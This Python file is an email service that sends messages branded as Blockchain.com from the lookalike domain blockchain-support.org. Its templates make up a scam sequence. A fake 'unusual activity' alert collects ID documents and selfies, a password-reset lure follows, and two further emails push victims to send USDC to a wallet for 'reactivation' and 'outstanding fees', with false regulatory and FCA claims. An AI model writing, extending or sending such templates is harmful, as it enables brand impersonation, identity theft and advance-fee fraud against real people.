"""
Email Service for Blockchain Wallet Platform
Uses Resend for transactional emails
"""

import os
from typing import Optional
from datetime import datetime, timezone
import logging

logger = logging.getLogger(__name__)

# Try to import resend, but don't fail if not installed yet
try:
    import resend
    RESEND_AVAILABLE = True
except ImportError:
    RESEND_AVAILABLE = False
    logger.warning("Resend package not installed. Email functionality will be limited.")


class EmailService:
    def __init__(self, api_key: Optional[str] = None, sender_email: Optional[str] = None):
        self.api_key = api_key or os.environ.get("RESEND_API_KEY")
        self.sender_email = sender_email or os.environ.get("SENDER_EMAIL", "noreply@blockchain-support.org")
        self.sender_name = "Blockchain.com"
        
        if self.api_key and RESEND_AVAILABLE:
            resend.api_key = self.api_key
    
    def is_configured(self) -> bool:
        """Check if email service is properly configured"""
        return bool(self.api_key) and RESEND_AVAILABLE
    
    async def send_email(
        self, 
        to_email: str, 
        subject: str, 
        html_body: str,
        text_body: Optional[str] = None
    ) -> dict:
        """Send an email using Resend"""
        
        if not self.is_configured():
            logger.warning(f"Email not configured. Would send to {to_email}: {subject}")
            return {
                "success": False,
                "error": "Email service not configured",
                "would_send": {
                    "to": to_email,
                    "subject": subject
                }
            }
        
        try:
            params = {
                "from": f"{self.sender_name} <{self.sender_email}>",
                "to": [to_email],
                "subject": subject,
                "html": html_body
            }
            
            if text_body:
                params["text"] = text_body
            
            response = resend.Emails.send(params)
            
            return {
                "success": True,
                "resend_id": response.get("id"),
                "sent_at": datetime.now(timezone.utc).isoformat()
            }
            
        except Exception as e:
            logger.error(f"Failed to send email: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def get_kyc_verification_email(self, user_name: str, verification_link: str) -> tuple:
        """Generate KYC verification email content"""
        subject = "Verify Your Identity - Blockchain.com"
        
        html_body = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <style>
                body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; color: #333; }}
                .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
                .header {{ background: linear-gradient(135deg, #1a1f3c 0%, #121530 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }}
                .header h1 {{ color: white; margin: 0; font-size: 24px; }}
                .content {{ background: #f8f9fa; padding: 30px; border-radius: 0 0 10px 10px; }}
                .button {{ display: inline-block; background: #0052ff; color: white; padding: 14px 28px; text-decoration: none; border-radius: 8px; margin: 20px 0; font-weight: 600; }}
                .footer {{ text-align: center; padding: 20px; color: #666; font-size: 12px; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Blockchain.com</h1>
                </div>
                <div class="content">
                    <h2>Identity Verification Required</h2>
                    <p>Dear {user_name},</p>
                    <p>We have detected some unusual activity on your account. To ensure the security of your funds and comply with regulatory requirements, we need you to verify your identity.</p>
                    <p>Please complete the KYC (Know Your Customer) verification process by clicking the button below:</p>
                    <p style="text-align: center;">
                        <a href="{verification_link}" class="button">Verify My Identity</a>
                    </p>
                    <p>You will need to provide:</p>
                    <ul>
                        <li>A valid government-issued ID (Passport or ID Card)</li>
                        <li>A selfie holding your ID</li>
                        <li>Proof of address (utility bill or bank statement)</li>
                    </ul>
                    <p>Once verified, you will receive instructions to reset your password and regain full access to your account.</p>
                    <p>If you did not request this verification or have any questions, please contact our support team immediately.</p>
                    <p>Best regards,<br>The Blockchain.com Security Team</p>
                </div>
                <div class="footer">
                    <p>© 2024 Blockchain.com. All rights reserved.</p>
                    <p>This email was sent to you because you have an account with Blockchain.com</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        return subject, html_body
    
    def get_password_reset_email(self, user_name: str, reset_link: str) -> tuple:
        """Generate password reset email content"""
        subject = "Reset Your Password - Blockchain.com"
        
        html_body = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <style>
                body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; color: #333; }}
                .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
                .header {{ background: linear-gradient(135deg, #1a1f3c 0%, #121530 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }}
                .header h1 {{ color: white; margin: 0; font-size: 24px; }}
                .content {{ background: #f8f9fa; padding: 30px; border-radius: 0 0 10px 10px; }}
                .button {{ display: inline-block; background: #0052ff; color: white; padding: 14px 28px; text-decoration: none; border-radius: 8px; margin: 20px 0; font-weight: 600; }}
                .footer {{ text-align: center; padding: 20px; color: #666; font-size: 12px; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Blockchain.com</h1>
                </div>
                <div class="content">
                    <h2>Reset Your Password</h2>
                    <p>Dear {user_name},</p>
                    <p>Your identity has been successfully verified. As part of our security protocol, you are now required to reset your password before accessing your account.</p>
                    <p>Click the button below to create a new password:</p>
                    <p style="text-align: center;">
                        <a href="{reset_link}" class="button">Reset Password</a>
                    </p>
                    <p>This link will expire in 24 hours for security reasons.</p>
                    <p>If you did not request this password reset, please contact our support team immediately.</p>
                    <p>Best regards,<br>The Blockchain.com Team</p>
                </div>
                <div class="footer">
                    <p>© 2024 Blockchain.com. All rights reserved.</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        return subject, html_body
    
    def get_reactivation_email(self, user_name: str, eth_wallet_address: str, required_amount: str = "100") -> tuple:
        """Generate account reactivation email content"""
        subject = "Reactivate Your Account - Blockchain.com"
        
        html_body = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <style>
                body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; color: #333; }}
                .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
                .header {{ background: linear-gradient(135deg, #1a1f3c 0%, #121530 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }}
                .header h1 {{ color: white; margin: 0; font-size: 24px; }}
                .content {{ background: #f8f9fa; padding: 30px; border-radius: 0 0 10px 10px; }}
                .wallet-box {{ background: #e9ecef; padding: 15px; border-radius: 8px; margin: 20px 0; word-break: break-all; font-family: monospace; text-align: center; }}
                .important {{ background: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; margin: 20px 0; }}
                .footer {{ text-align: center; padding: 20px; color: #666; font-size: 12px; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Blockchain.com</h1>
                </div>
                <div class="content">
                    <h2>Account Reactivation Required</h2>
                    <p>Dear {user_name},</p>
                    <p>Your account has been flagged for inactivity and is scheduled for closure as per our regulatory compliance requirements. To reactivate your account and access your funds, you must demonstrate account activity.</p>
                    
                    <div class="important">
                        <strong>Required Action:</strong>
                        <p>Make a positive transaction of <strong>{required_amount} EUR in USDC (ERC-20)</strong> to your wallet address below.</p>
                        <p><em>This is NOT a payment or fee. You will be able to withdraw this amount back to your bank account immediately after your account is reactivated.</em></p>
                    </div>
                    
                    <p><strong>Your USDC (ERC-20) Wallet Address:</strong></p>
                    <div class="wallet-box">
                        {eth_wallet_address}
                    </div>
                    
                    <p><strong>How to deposit:</strong></p>
                    <ol>
                        <li>Copy the wallet address above</li>
                        <li>Purchase USDC from a third-party provider (e.g., Coinbase, Binance, Kraken)</li>
                        <li>Send the USDC to the wallet address above using the ERC-20 network</li>
                        <li>Your account will be automatically reactivated once the transaction is confirmed</li>
                    </ol>
                    
                    <div class="important">
                        <strong>Important Notice:</strong>
                        <p>Please note that Blockchain.com no longer offers direct crypto purchasing services for accounts flagged for suspicious activity. You must use an external provider to purchase USDC.</p>
                        <p>The Blockchain system operates on automated protocols that require periodic activity to maintain account status. Transaction fees support the infrastructure that keeps your wallet secure.</p>
                    </div>
                    
                    <p>Once your account is reactivated, you will be able to withdraw all your funds. However, please note that any outstanding transaction fees must be cleared before withdrawal can be processed.</p>
                    
                    <p>If you have any questions, please contact our support team.</p>
                    <p>Best regards,<br>The Blockchain.com Compliance Team</p>
                </div>
                <div class="footer">
                    <p>© 2024 Blockchain.com. All rights reserved.</p>
                    <p>Blockchain.com is registered with the UK Financial Conduct Authority (FCA)</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        return subject, html_body
    
    def get_fee_payment_email(self, user_name: str, total_fees: str, eth_wallet_address: str) -> tuple:
        """Generate fee payment required email content"""
        subject = "Outstanding Fees - Action Required - Blockchain.com"
        
        html_body = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <style>
                body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; color: #333; }}
                .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
                .header {{ background: linear-gradient(135deg, #1a1f3c 0%, #121530 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }}
                .header h1 {{ color: white; margin: 0; font-size: 24px; }}
                .content {{ background: #f8f9fa; padding: 30px; border-radius: 0 0 10px 10px; }}
                .fee-box {{ background: #dc3545; color: white; padding: 20px; border-radius: 8px; margin: 20px 0; text-align: center; }}
                .fee-box h3 {{ margin: 0; font-size: 32px; }}
                .wallet-box {{ background: #e9ecef; padding: 15px; border-radius: 8px; margin: 20px 0; word-break: break-all; font-family: monospace; text-align: center; }}
                .important {{ background: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; margin: 20px 0; }}
                .footer {{ text-align: center; padding: 20px; color: #666; font-size: 12px; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Blockchain.com</h1>
                </div>
                <div class="content">
                    <h2>Outstanding Transaction Fees</h2>
                    <p>Dear {user_name},</p>
                    <p>Your account has outstanding transaction fees that must be cleared before you can withdraw your funds.</p>
                    
                    <div class="fee-box">
                        <p style="margin: 0; font-size: 14px;">Total Outstanding Fees</p>
                        <h3>{total_fees} EUR</h3>
                    </div>
                    
                    <div class="important">
                        <strong>Why do I have fees?</strong>
                        <p>Transaction fees are automatically calculated based on your historical trading activity. These fees support the blockchain network infrastructure, security protocols, and regulatory compliance systems.</p>
                    </div>
                    
                    <p>To clear your fees and enable withdrawals, please send the equivalent amount in USDC (ERC-20) to your wallet address:</p>
                    
                    <div class="wallet-box">
                        {eth_wallet_address}
                    </div>
                    
                    <div class="important">
                        <strong>Regulatory Notice:</strong>
                        <p>Due to regulatory requirements and our company's integrity protocols, we cannot deduct fees directly from your existing balance. When an account is flagged for review or scheduled for closure, all fund movements must be cleared externally to comply with anti-money laundering (AML) regulations.</p>
                        <p>This is a standard procedure mandated by financial regulators to ensure the legitimacy of all transactions.</p>
                    </div>
                    
                    <p>Once your fees are paid, you will be able to withdraw your full balance to your bank account.</p>
                    
                    <p>If you have any questions about your fees or need assistance, please contact our support team.</p>
                    <p>Best regards,<br>The Blockchain.com Finance Team</p>
                </div>
                <div class="footer">
                    <p>© 2024 Blockchain.com. All rights reserved.</p>
                    <p>Blockchain.com is registered with the UK Financial Conduct Authority (FCA)</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        return subject, html_body
    
    def get_welcome_email(self, user_name: str, login_link: str) -> tuple:
        """Generate welcome email for new users"""
        subject = "Welcome to Blockchain.com"
        
        html_body = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <style>
                body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; color: #333; }}
                .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
                .header {{ background: linear-gradient(135deg, #1a1f3c 0%, #121530 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }}
                .header h1 {{ color: white; margin: 0; font-size: 24px; }}
                .content {{ background: #f8f9fa; padding: 30px; border-radius: 0 0 10px 10px; }}
                .button {{ display: inline-block; background: #0052ff; color: white; padding: 14px 28px; text-decoration: none; border-radius: 8px; margin: 20px 0; font-weight: 600; }}
                .footer {{ text-align: center; padding: 20px; color: #666; font-size: 12px; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Blockchain.com</h1>
                </div>
                <div class="content">
                    <h2>Welcome to Blockchain.com!</h2>
                    <p>Dear {user_name},</p>
                    <p>Your account has been successfully created. Welcome to the world's most trusted cryptocurrency platform.</p>
                    <p>With Blockchain.com, you can:</p>
                    <ul>
                        <li>Securely store your cryptocurrency</li>
                        <li>Send and receive digital assets</li>
                        <li>Track your portfolio in real-time</li>
                        <li>Access institutional-grade security</li>
                    </ul>
                    <p style="text-align: center;">
                        <a href="{login_link}" class="button">Access Your Wallet</a>
                    </p>
                    <p>If you have any questions, our support team is available 24/7.</p>
                    <p>Best regards,<br>The Blockchain.com Team</p>
                </div>
                <div class="footer">
                    <p>© 2024 Blockchain.com. All rights reserved.</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        return subject, html_body


# Create global instance that will be initialized with env vars
email_service = None

def get_email_service():
    global email_service
    if email_service is None:
        email_service = EmailService()
    return email_service
